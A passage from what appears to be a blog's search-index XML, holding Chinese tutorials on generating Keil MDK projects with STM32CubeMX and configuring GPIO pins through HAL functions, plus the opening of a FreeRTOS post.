<h2 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a><span id = 'create_code'>生成代码</span></h2><p>由于我使用的是<code>keil mdk arm 5.24</code>来编译和烧写stm32单片机，所以只讲如何生成<code>keil-mdk</code>的代码工程。</p>
<p>点击菜单栏的<code>Project</code>下的<code>Generate Code</code>，然后出现的配置菜单中选择<code>Toolchain / IDE</code>为<code>MDK-ARM V5</code>，然后选择好工程名字和目录，点击OK即可。一般会让你下载相应系列芯片的库，如果觉得软件下载太慢，直接去<a href="http://www.st.com/content/st_com/zh/products/development-tools/software-development-tools/stm32-software-development-tools/stm32-configurators-and-code-generators/stm32cubemx.html">官网</a>下载即可，然后注意修改下方的固件库目录到你下载的目录即可。</p>
<img src="2018_03_21_05.png" width = "80%" />

<p>生成完成选择<code>open project</code>就可以打开工程进行自己的代码编写了。但是自己写的代码一定要在两个注释的中间</p>
<pre><code>/* USER CODE BEGIN 2 */

/* USER CODE END 2 */
</code></pre>
<p>否则再次生成工程时会被洗掉。编译成功下载即可。</p>
<h2 id="配置GPIO"><a href="#配置GPIO" class="headerlink" title="配置GPIO"></a>配置GPIO</h2><p>单片机最基础的是GPIO的配置，做完GPIO的配置就可以点灯来验证程序是否运行了。GPIO分为输入和输出两个方向，分别讲解。</p>
<h3 id="GPIO输出配置"><a href="#GPIO输出配置" class="headerlink" title="GPIO输出配置"></a>GPIO输出配置</h3><p>GPIO的配置比较简单，直接点选芯片引脚相应的GPIO引脚，比如我手上开发板的<code>PC13</code>为<code>LED</code>，就选择<code>PC13</code>为<code>GPIO_Output</code>。</p>
<img src="2018_03_21_02.png" width = "80%" />

<p>然后到大分层中的<code>Configuration</code>一栏中选择<code>System</code>下的GPIO，然后在出现的界面中选择配置的引脚，选择输出为高还是低，输出模式(<a href="https://www.douban.com/note/206867792/">push pull 和 open drain</a>)，是否上下拉和GPIO输出速度。</p>
<img src="2018_03_21_03.png" width = "80%" />

<p>点击OK即可。</p>
<h3 id="GPIO输入配置"><a href="#GPIO输入配置" class="headerlink" title="GPIO输入配置"></a>GPIO输入配置</h3><p>输入配置和输出类似，选择<code>GPIO_Input</code>，然后在选项中选择好上下拉即可。</p>
<img src="2018_03_21_04.png" width = "80%" />

<h3 id="代码控制"><a href="#代码控制" class="headerlink" title="代码控制"></a>代码控制</h3><p>输出的控制函数为</p>
<pre><code>HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);
</code></pre>
<p>读取的函数为</p>
<pre><code>HAL_GPIO_ReadPin(GPIOC, GPIO_PIN_13);
</code></pre>
<p>可以用这两个函数控制灯的闪烁了。</p>
]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Stm32cubemx</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>stm32cubemx使用freertos的介绍</title>
    <url>/blogs/2018_03_16_stm32cubemx_freeRTOS/</url>
    <content><![CDATA[<p>本博客仅为自己在使用时的总结，希望有所帮助</p>
<h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul>
<li>系统 <code>Windows10 1709</code></li>
<li>软件 <code>stm32cubemx 4.25.0</code></li>
<li>编译软件 <code>keil-mdk arm 5.24</code></li>
<li>语言 <code>C语言</code></li>
</ul>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是在上一篇文章（<a href="/2018/03/30/2018_03_16_stm32cubemx_config/">stm32cubemx配置介绍</a>）的基础上，利用freeRTOS的一些介绍，希望对想要了解或者使用freeRTOS的码友们提供帮助。本文只是自己在使用时的总结，仅供参考。</p>
]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Stm32cubemx</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
</search>
